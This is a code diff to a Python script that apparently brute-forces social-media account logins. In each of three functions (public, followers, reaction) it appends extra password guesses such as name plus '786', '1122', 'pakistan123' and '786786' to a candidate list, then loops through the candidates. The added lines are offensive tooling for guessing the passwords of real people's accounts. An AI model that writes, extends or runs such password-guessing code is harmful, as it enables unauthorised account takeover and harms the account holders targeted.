@@ -259,9 +259,17 @@ def public():
 					pwx.append(ss+"123")
 					pwx.append(ss+"1234")
 					pwx.append(ss+"12345")
+					pwx.append(ss+"786")
+					pwx.append(ss+"1122")
+					pwx.append(ss+"12")
+					pwx.append(ss+"1")
 				else:
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
+					pwx.append(ss+"pakistan")
+					pwx.append(ss+"pakistan1")
+					pwx.append(ss+"pakistan123")
+					pwx.append(ss+"786786")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -351,9 +359,17 @@ def followers():
 					pwx.append(ss+"123")
 					pwx.append(ss+"1234")
 					pwx.append(ss+"12345")
+					pwx.append(ss+"786")
+					pwx.append(ss+"1122")
+					pwx.append(ss+"12")
+					pwx.append(ss+"1")
 				else:
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
+					pwx.append(ss+"pakistan")
+					pwx.append(ss+"pakistan1")
+					pwx.append(ss+"pakistan123")
+					pwx.append(ss+"786786")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -443,9 +459,17 @@ def reaction():
 					pwx.append(ss+"123")
 					pwx.append(ss+"1234")
 					pwx.append(ss+"12345")
+					pwx.append(ss+"786")
+					pwx.append(ss+"1122")
+					pwx.append(ss+"12")
+					pwx.append(ss+"1")
 				else:
 					pwx.append(ss+"123")
 					pwx.append(ss+"12345")
+					pwx.append(ss+"pakistan")
+					pwx.append(ss+"pakistan1")
+					pwx.append(ss+"pakistan123")
+					pwx.append(ss+"786786")
 		try:
 			for pw in pwx:
 				pw = pw.lower()
